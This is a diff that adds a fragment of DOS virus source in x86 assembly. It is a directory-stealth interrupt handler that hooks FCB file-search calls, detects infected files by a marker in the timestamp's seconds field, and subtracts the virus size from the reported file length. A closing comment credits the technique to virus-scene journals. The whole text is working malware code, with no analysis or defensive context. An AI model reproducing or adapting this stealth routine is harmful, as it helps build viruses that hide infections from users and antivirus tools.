@@ -1,0 +1,39 @@
+;*****************************************************
+dir_s:                                                               
+             pushf                                                         
+             push    cs                                                    
+             call    a3                      ;Get file Stats                       
+             test    al,al                   ;Good FCB?                            
+             jnz     no_good                 ;nope                                 
+             push    ax                                                 
+             push    bx                                                    
+             push    es                                                    
+             mov     ah,51h                  ;Is this Undocmented? huh...          
+             int     21h                                                   
+             mov     es,bx                                                 
+             cmp     bx,es:[16h]                                           
+             jnz     not_infected                        
+             mov     bx,dx                                                 
+             mov     al,[bx]                                               
+             push    ax                                                    
+             mov     ah,2fh                   ;Get file DTA                         
+             int     21h                                                   
+             pop     ax                                                    
+             inc     al                                                    
+             jnz     fcb_okay                                              
+             add     bx,7h                                                 
+fcb_okay:    mov     ax,es:[bx+17h]                                   
+             and     ax,1fh                   ;UnMask Seconds Field                 
+             xor     al,byte ptr cs:fechad                                      
+             jnz     not_infected                                            
+             and     byte ptr es:[bx+17h],0e0h                            
+             sub     es:[bx+1dh],OFFSET FIN - OFFSET START  ;Yes minus virus size       
+             sbb     es:[bx+1fh],ax                                        
+not_infected:pop     es                                                    
+             pop     bx                                                    
+             pop     ax                                                    
+no_good:     iret                                                          
+;********************************************************************
+; THIS DIR STEALTH METOD IS EXTRAC FROM NUKEK INFO JOURNAL 4 & N-POX 
+;*********************************************************************
+
